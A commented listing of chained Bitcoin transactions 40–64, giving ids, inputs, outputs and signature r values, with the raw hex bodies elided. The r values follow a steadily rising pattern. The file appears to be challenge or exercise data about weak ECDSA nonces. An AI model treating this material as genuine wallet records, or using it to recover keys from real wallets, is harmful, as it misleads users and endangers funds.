# 20b5e91bfd30ed65c5cc563a3c42608f42a81db50d86c5506e09ae3814a4e3c7:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2940000:1EKLNPoywyM52R5o7FBvWeQLdab7y9AQAR
#
# locktime: 0
#
#
# Transaction 40
# Hex transaction
# ...
#
# r value of the signature:
# 2804a347676e039ad827154e390c3dfe7069f467290e03ff995035b043bc9963
#
# tx: 5c3310bbc3d2de43bd0e550de2528bfa41550c80cf087d285561bc7cb89e2fe2
# version: 1
# tx_ins:
# 9df4b7cbd57bd85a486005d2cc89996a798c1b9b281efc952c568ec7aa82f3b3:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2838500:19cRBeXD6hRSgKcyZQ9hGfLv6Zfkgea3Ki
#
# locktime: 0
# Transaction 41
# Hex transaction
# ...
#
# r value of the signature:
# 297ad49593df3ad92d583b3ed23e50aca450fc36f99bf6ba283afe74ab6cfa8b
#
# tx: 99ba3970fd5a566432146a8f99547e77ef2787f662fab4190771745e632ca0ac
# version: 1
# tx_ins:
# 5c3310bbc3d2de43bd0e550de2528bfa41550c80cf087d285561bc7cb89e2fe2:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2737000:1GXJacoERyfoPtH9JZyJgtfu1GETBA58PS
#
# locktime: 0
#
#
# Transaction 42
# Hex transaction
# ...
#
# r value of the signature:
# 2a02acdd567b4d46d054cc007cce752e430443f19b74ff0be3b81bab142990ed
#
# tx: e49a0bb2938824c7d5906f03073f6f520c9a581d5c0e4c0cca444c8900aa41fc
# version: 1
# tx_ins:
# 99ba3970fd5a566432146a8f99547e77ef2787f662fab4190771745e632ca0ac:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2635500:16ZGjPGUutbk79kLhqBF9J5zsEMrG2uCSA
#
# locktime: 0
#
#
# Transaction 43
# Hex transaction
# ...
#
# r value of the signature:
# 2bc90da394bdf385f8f595ec905f6099e4ba1c5542a9c57a629799e3759b9901
#
# tx: 0410b7967cb35673c28641bde59155a435c77f408fa18020609bab312d07ccd7
# version: 1
# tx_ins:
# e49a0bb2938824c7d5906f03073f6f520c9a581d5c0e4c0cca444c8900aa41fc:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2534000:1FLv3ommexoKzjfFCZyfkWxnTznqQdRCKU
#
# locktime: 0
#
#
# Transaction 44
# Hex transaction
# ...
#
# r value of the signature:
# 2cbf5535d4772924b2623b4e3bc5d350184dcd4a65b5336821786b31336f6ef9
#
# tx: 21b767910e66734bcaf7e403afea6382ee2efd2b39a0bfcd94d8f66d141bfb35
# version: 1
# tx_ins:
# 0410b7967cb35673c28641bde59155a435c77f408fa18020609bab312d07ccd7:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2432500:17eoH71b7X34oMqgaEFZ5jPZJtsT8idN6J
#
# locktime: 0
#
#
# Transaction 45
# Hex transaction
# ...
#
# r value of the signature:
# 2d9f89fe7fc8bd75168bf94f45454dfefcf7470c6e55fe5a99128bcac18a869a
#
# tx: 91bcbf49a2fc87a5f02e967422debd5ce8436c840fc6d430e23f6fb0ac3e8e0f
# version: 1
# tx_ins:
# 21b767910e66734bcaf7e403afea6382ee2efd2b39a0bfcd94d8f66d141bfb35:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2331000:1J4ixzZqNN7AbFbVr7iMzHTurnVgRwBrbU
#
# locktime: 0
#
#
# Transaction 46
# Hex transaction
# ...
#
# r value of the signature:
# 2ecefa73353ea99745ab382463426c7f38908bdfdc23507a83eb0c067a1ce67b
#
# tx: 0b8ddc84e9bc09be3f761c6da5a0849cf3b564bd5b82dfe46cd63ba7bf232c94
# version: 1
# tx_ins:
# 91bcbf49a2fc87a5f02e967422debd5ce8436c840fc6d430e23f6fb0ac3e8e0f:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2229500:1E6Uumg6fzVtQGG1EEEUqAb4o1ceoXDkqa
#
# locktime: 0
#
#
# Transaction 47
# Hex transaction
# ...
#
# r value of the signature:
# 2fa952d7c7757faa57bf7f4f92fc8af0701ed95376a2e9af1c14e85e099a0a03
#
# tx: 127939538b0071470cee9bc9a521c72a19748ecd8e330036a48be742400bcb1f
# version: 1
# tx_ins:
# 0b8ddc84e9bc09be3f761c6da5a0849cf3b564bd5b82dfe46cd63ba7bf232c94:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2128000:1Pe1ZkMDHHgUJDj43rfnmddujLJvxpyC4W
#
# locktime: 0
#
#
# Transaction 48
# Hex transaction
# ...
#
# r value of the signature:
# 30d503782dbffe81dad074999272cbdbd705ccfcb0f132cf0160f3bceda0cf73
#
# tx: e9910e8e1dff2c02f1d21b88247bf16f88743c0ff78475b7efb77f31a830c88c
# version: 1
# tx_ins:
# 127939538b0071470cee9bc9a521c72a19748ecd8e330036a48be742400bcb1f:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 2026500:1Efe5VuMk9w7Rao1qKcDJhxe6oW829Piwt
#
# locktime: 0
#
#
# Transaction 49
# Hex transaction
# ...
#
# r value of the signature:
# 31104edc6b8564f1354dc487d1fafa5b91d2bd96dfcf829f75c17f7dbce77636
#
# tx: 3217a6f2c9103976392d0ca9bd75449826aed8e6bf88f6d795baa644199a4a3d
# version: 1
# tx_ins:
# e9910e8e1dff2c02f1d21b88247bf16f88743c0ff78475b7efb77f31a830c88c:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1925000:1KcvG6i9tDwk852kP91VnGPX4kZtvFYwnK
#
# locktime: 0
#
#
# Transaction 50
# Hex transaction
# ...
#
# r value of the signature:
# 32005fedf5bca44f98f6737a3a6092038497ca43aeab6523eb5f91efa76cf8de
#
# tx: b2f8ae85aed80c7acdaaa428bcf16be835030146e3e3fb2389c574e4c69d6809
# version: 1
# tx_ins:
# 3217a6f2c9103976392d0ca9bd75449826aed8e6bf88f6d795baa644199a4a3d:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1823500:1Mu2Fnek6bookQLyKeBzHiRhTbQWHK794k
#
# locktime: 0
# Transaction 51
# Hex transaction
# ...
#
# r value of the signature:
# 33d04b21fcf7cf1a73e89c5bce651ef28735165c06a9022dea0e2690874912e8
#
# tx: f9b8d26b00db2bb4d1c413ef1c9257cadaaff34783352c8f776a48ba0aa96f1d
# version: 1
# tx_ins:
# b2f8ae85aed80c7acdaaa428bcf16be835030146e3e3fb2389c574e4c69d6809:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1722000:1Jpz4xw6hZvmdB53xJjsxhzZ7GMeRHQ2ig
#
# locktime: 0
#
#
# Transaction 52
# Hex transaction
# ...
#
# r value of the signature:
# 347da95376dd521b1e5c09cd7959126eab7db5af1f181828216d8fd6d7f82df4
#
# tx: 36eb8781a0c2669dac6a2a4d969fca51d8ac057f889595af4cd3ce492e1a16a8
# version: 1
# tx_ins:
# f9b8d26b00db2bb4d1c413ef1c9257cadaaff34783352c8f776a48ba0aa96f1d:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1620500:1DtbNkkFYmpe6rtzDxy4dh4kopSiS26TGn
#
# locktime: 0
#
#
# Transaction 53
# Hex transaction
# ...
#
# r value of the signature:
# 35897ec9d025231943397c35105b140635e9b363e9747bfdd78bf34a51f341ff
#
# tx: 5d2013f749f57f69a5e44fca5d27b2fe10ca2c77cef6263be2e005567853fd83
# version: 1
# tx_ins:
# 36eb8781a0c2669dac6a2a4d969fca51d8ac057f889595af4cd3ce492e1a16a8:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1519000:1DAhwzSaVLhAcM29oR2rpBngpcb76R6Muf
#
# locktime: 0
#
#
# Transaction 54
# Hex transaction
# ...
#
# r value of the signature:
# 36fcb9c51893622c3e16a19044de9839086efda646d0d357074831bcc987c5ef
#
# tx: 25b4f1d748e3091a0e1366a2a469897b04fd73d2b6f566e6ac7fa17bb06aa037
# version: 1
# tx_ins:
# 5d2013f749f57f69a5e44fca5d27b2fe10ca2c77cef6263be2e005567853fd83:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1417500:1PPsxqLfqBJpm4rH4cH35Kem5zUbTC9iZ
#
# locktime: 0
#
#
# Transaction 55
# Hex transaction
# ...
#
# r value of the signature:
# 37452b6997717ec4636060e783ba6650be2324445dd11a9d7582cfdc0ff9bf74
#
# tx: 6f50b4ecd9938deb1d3cbd5db8df5b02b3ac56fa5290a6cf78d3d999d7c87b11
# version: 1
# tx_ins:
# 25b4f1d748e3091a0e1366a2a469897b04fd73d2b6f566e6ac7fa17bb06aa037:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1316000:1EwA8eSnjPhW87iruSez7rxfgHfUbMdWFL
#
# locktime: 0
#
#
# Transaction 56
# Hex transaction
# ...
#
# r value of the signature:
# 38a5274386f66deae21fa95f0bd57117e8daea651aafd61297fec9a9f9891274
#
# tx: a2fa50ae2848c46ddda51f2f33add3df1c024aff385ca052435342f4b276a5b3
# version: 1
# tx_ins:
# 6f50b4ecd9938deb1d3cbd5db8df5b02b3ac56fa5290a6cf78d3d999d7c87b11:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1214500:1LqDMo4F1cQr7aqduL9Z9Qga7e8TbKP4Wx
#
# locktime: 0
#
#
# Transaction 57
# Hex transaction
# ...
#
# r value of the signature:
# 393307c92a9e48fde231fd308e4fcf56945a13e9492344ecfc5a700086480e1f
#
# tx: 76229e885843d644733fb9c4d5fe135bda336183c90fae3d636df9914286acb1
# version: 1
# tx_ins:
# a2fa50ae2848c46ddda51f2f33add3df1c024aff385ca052435342f4b276a5b3:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1113000:12ug6wwdtGsVeJNJDoniXDm23Zr75tAe5k
#
# locktime: 0
#
#
# Transaction 58
# Hex transaction
# ...
#
# r value of the signature:
# 3a4a891fbf809e17055cf308eed386a20089afeeff567cdbcaedc6ea31820dab
#
# tx: 3d7f441a242baec828d4c1df7a3554d0380f6ee26f3ec7fb5761c4a5f1226166
# version: 1
# tx_ins:
# 76229e885843d644733fb9c4d5fe135bda336183c90fae3d636df9914286acb1:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 1011500:18m6EuqR7kTQ46cBnVND1DUXTT3bycbBhe
#
# locktime: 0
#
#
# Transaction 59
# Hex transaction
# ...
#
# r value of the signature:
# 3bf4da0c1a2c0ec7ddbcba7749935649667de1ea6f5a6a783e6712cce6650496
#
# tx: abfc441dedd32c5d8d4c23563a144b21506ea4750031ea80d0f1a09e85ab289e
# version: 1
# tx_ins:
# 3d7f441a242baec828d4c1df7a3554d0380f6ee26f3ec7fb5761c4a5f1226166:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 910000:14dDbgrJDt1VN56JmaP7W8RhGk2fp21MMz
#
# locktime: 0
#
#
# Transaction 60
# Hex transaction
# ...
#
# r value of the signature:
# 3c23ea534cc890f7ffa70d3baea43a6450f555e85d90a7571bdcddb5dbc2974a
#
# tx: 956631f6630492b754a64bac65b8653138701d014579526cc12717535d630b2d
# version: 1
# tx_ins:
# abfc441dedd32c5d8d4c23563a144b21506ea4750031ea80d0f1a09e85ab289e:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 808500:1Dhw4MupjXfMNZpNHuaDduVGQ4uomXkEVc
#
# locktime: 0
# Transaction 61
# Hex transaction
# ...
#
# r value of the signature:
# 3d1e5c1596acce05c69175670fc90fa0868c7ba902d0d670ed4dff0d92d96d6a
#
# tx: cbc08b19978faf7e81853a9e7ac8f6792e79aebaf9743962df07e3d16d74a7a0
# version: 1
# tx_ins:
# 956631f6630492b754a64bac65b8653138701d014579526cc12717535d630b2d:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 707000:15ShiRn3dKxAUgmWEbVEqFeGo7ckyjGvZn
#
# locktime: 0
#
#
# Transaction 62
# Hex transaction
# ...
#
# r value of the signature:
# 3e61069c2a2e10ebc73976eb383a0299cbbe21089d3d069e5360870fc802f563
#
# tx: 600f740fd392f9b5a9e4cdbcac4aebfd364b6cdec092224d85a49c2b82f92774
# version: 1
# tx_ins:
# cbc08b19978faf7e81853a9e7ac8f6792e79aebaf9743962df07e3d16d74a7a0:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 605500:1NGE46qDVmjHYPQpUZrADwdxnXP3ifv5sc
#
# locktime: 0
#
#
# Transaction 63
# Hex transaction
# ...
#
# r value of the signature:
# 3f94476a5630120121ec5b1e6d1cb3121e8df271366193361c9f9127cf86286d
#
# tx: dd39e8dbb028977829f5250725c66bd7370a1f2d8444819735dd7ead02b7557d
# version: 1
# tx_ins:
# 600f740fd392f9b5a9e4cdbcac4aebfd364b6cdec092224d85a49c2b82f92774:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 504000:1HPLi8T9UCX1UwPupckHRA7dbx7th5vhCJ
#
# locktime: 0
#
#
# Transaction 64
# Hex transaction
# ...
#
# r value of the signature:
# 0057438e022fc1a9d4027175e30204dc2e785454b34423607578f628e8d81c01
#
# tx: ae28f731f56631f59b3d565533a000a1bbb9d747e04927413471a8c570e604c9
# version: 1
# tx_ins:
# dd39e8dbb028977829f5250725c66bd7370a1f2d8444819735dd7ead02b7557d:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 402500:1CRb7u6My8UWHDyrQjiTZ1Lv5meCTvxx2K
#
# locktime: 0
